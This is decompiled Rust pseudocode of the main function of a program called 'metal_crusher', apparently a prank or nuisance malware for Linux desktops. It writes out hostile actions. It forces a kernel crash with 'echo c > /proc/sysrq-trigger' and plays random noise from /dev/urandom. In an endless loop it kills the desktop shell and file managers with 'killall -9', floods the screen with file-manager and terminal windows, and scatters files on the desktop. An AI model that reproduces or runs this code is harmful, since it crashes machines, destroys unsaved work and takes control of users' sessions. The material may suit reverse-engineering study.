fn metal_crusher::main() -> int {
    let v0: std::env::Args;  // [bp-0x268], Other Possible Types: struct48, struct24, u128
    let v1: alloc::boxed::Box<[u8], alloc::alloc::Global>;  // [bp-0x268], Other Possible Types: struct24
    let v2: alloc::boxed::Box<[u8], alloc::alloc::Global>;  // [bp-0x268]
    let v3: alloc::boxed::Box<[u8], alloc::alloc::Global>;  // [bp-0x268]
    let v4: alloc::boxed::Box<[u8], alloc::alloc::Global>;  // [bp-0x268]
    let v5: u64;  // [bp-0x260]
    let v6: alloc::boxed::Box<[u8], alloc::alloc::Global>;  // [bp-0x258], Other Possible Types: struct_0 *, u64
    let v7: u64;  // [bp-0x250]
    let v8: void*;  // [bp-0x248], Other Possible Types: u64
    let v9: u64;  // [bp-0x240]
    let v10: alloc::boxed::Box<[u8], alloc::alloc::Global>;  // [bp-0x238]
    let v11: alloc::boxed::Box<[u8], alloc::alloc::Global>;  // [bp-0x228]
    let v12: void*;  // [bp-0x218]
    let v13: u64;  // [bp-0x210]
    let v14: u64;  // [bp-0x208]
    let v15: struct24;  // [bp-0x1f8], Other Possible Types: struct_0 *
    let v19: u64;  // [bp-0x1f0]
    let v21: void*;  // [bp-0x1b8]
    let v22: u64;  // [bp-0x1a8]
    let v23: u64;  // [bp-0x1a0]
    let v24: u64;  // [bp-0x198]
    let v25: u8;  // [bp-0x190]
    let v26: u32;  // [bp-0x18f]
    let v27: u16;  // [bp-0x18b]
    let v28: u8;  // [bp-0x189]
    let v37: u8;  // [bp-0x148]
    let v38: u64;  // [bp-0x140]
    let v39: u32;  // [bp-0x138]
    let v42: struct24;  // [bp-0xf8]
    let v43: u64;  // [bp-0xb8]
    let v44: u64;  // [bp-0xa0]
    let v51: u64;  // rax
    let v52: u64;  // rdx
    let v53: u64;  // rax
    let v54: u64;  // rcx
    let v55: u64;  // r8
    let v56: u64;  // rax
    let v57: u32;  // ebx
    let v58: u64;  // rdx
    let v59: u64;  // rcx
    let v60: u32;  // ebx
    let v61: u64;  // rax
    let v62: u32;  // ebx
    let v63: u32;  // ebx
    let v71: alloc::string::String;  // [bp-0xc8]
    let v72: alloc::string::String;  // [bp-0xb0]

    v0 = std::env::args();
    core::iter::traits::iterator::Iterator::collect(&v37, &v0);
    v0 = <T as alloc::slice::<impl [T]>::to_vec_in::ConvertVec>::to_vec();
    v15 = v1;
    v42 = core::result::Result<T,E>::unwrap(&v15);
    if <T as core::slice::cmp::SliceContains>::slice_contains(&v42, v38, v39) {
        std::thread::sleep(108, 0);
        metal_crusher::fun::execute_shell("cat /dev/urandom | aplay");
        std::thread::sleep(1, 0);
        metal_crusher::fun::execute_shell("echo c > /proc/sysrq-trigger");
        return;
    }
    v22 = 0x8000000000000000;
    v21 = 0;
    v25 = 0;
    v0 = struct48 {
        field_0: *(&v21 as &i128)
        field_16: v22
        field_24: v23
        field_32: v24
        field_40: 0
        field_41: v26
        field_45: v27
        field_47: v28
    };
    v15 = std::thread::Builder::spawn_unchecked(&v0);
    v0 = core::result::Result<T,E>::expect(&v15);
    metal_crusher::music::play_audio();
    metal_crusher::fun::notify("Fun things will happen soon", ":D");
    std::thread::sleep(1, 0);
    metal_crusher::fun::notify("Fun things will happen soon", ":D");
    std::thread::sleep(None, 0x17d78400);
    v14 = metal_crusher::fun::detect_terminal();
    std::thread::sleep(2, 0x11e1a300);
    loop {
        v1 = "xdg-open /";
        v6 = "xdg-open /bin";
        v8 = &g_4338cb;
        v9 = 13;
        v10 = "xdg-open /home";
        v11 = "xdg-open /tmp";
        v12 = 0;
        v13 = 5;
        loop {
            v51 = <core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next(&v1 as u64);
            if !v51 {
                break;
            }
            metal_crusher::fun::execute_shell(v51, v52);
            std::thread::sleep(None, 0x23c34600);
        }
        loop {
            v53 = <core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next(&v2 as u64);
            if !v53 {
                break;
            }
            metal_crusher::fun::run_in_terminal(v14, v52, v53, v52);
            std::thread::sleep(None, 0x23c34600);
        }
        metal_crusher::fun::destroy_gui_shell();
        metal_crusher::fun::destroy_file_managers();
        v15 = &v14;
        v19 = <&T as core::fmt::Display>::fmt;
        v0 = "killall -9 ";
        v5 = 1;
        v8 = 0;
        v6 = &v15;
        v7 = 1;
        v71 = core::option::Option<T>::map_or_else(&v0, v52, v54, v55);
        v0 = *(&v71.vec.buf.inner.cap as &i128);
        v6 = v43;
        metal_crusher::fun::execute_shell(1, v43);
        std::thread::sleep(1, 0xbebc200);
        metal_crusher::fun::reanimate_gui_shell();
        loop {
            v56 = <core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next(&v3 as u64);
            if !v56 {
                break;
            }
            metal_crusher::fun::execute_shell(v56, v52);
            std::thread::sleep(None, 0x23c34600);
        }
        metal_crusher::fun::run_in_terminal(v14, v52, "tree /home; sleep 2000");
        std::thread::sleep(None, 0x23c34600);
        loop {
            v60 = v57 - 1;
            if v57 == 1 {
                break;
            }
            metal_crusher::fun::run_in_terminal(v14, v52, "ps aux; sleep 2000");
            std::thread::sleep(None, 0x23c34600);
            v57 = v60;
        }
        v15 = &v14;
        v19 = <&T as core::fmt::Display>::fmt;
        v0 = "killall -9 ";
        v5 = 1;
        v8 = 0;
        v6 = &v15;
        v7 = 1;
        v72 = core::option::Option<T>::map_or_else(&v0, v58, v59, v55);
        v0 = *(&v72.vec.buf.inner.cap as &i128);
        v6 = v44;
        metal_crusher::fun::execute_shell(1, v44);
        std::thread::sleep(1, 0xbebc200);
        metal_crusher::fun::destroy_file_managers();
        std::thread::sleep(2, 0);
        metal_crusher::fun::toggle_desktop_overview();
        metal_crusher::fun::put_random_shit_on_desktop();
        metal_crusher::fun::toggle_desktop_overview();
        loop {
            v61 = <core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next(&v4 as u64);
            if !v61 {
                break;
            }
            metal_crusher::fun::execute_shell(v61, v52);
            metal_crusher::fun::execute_shell(1, 0);
            std::thread::sleep(1, 0x1dcd6500);
        }
        std::thread::sleep(None, 0x1dcd6500);
        loop {
            v63 = v62 - 1;
            if v62 == 1 {
                break;
            }
            std::thread::sleep(None, 0xbebc200);
            metal_crusher::fun::toggle_desktop_overview();
            v62 = v63;
        }
        std::thread::sleep(3, 0x1dcd6500);
    }
}
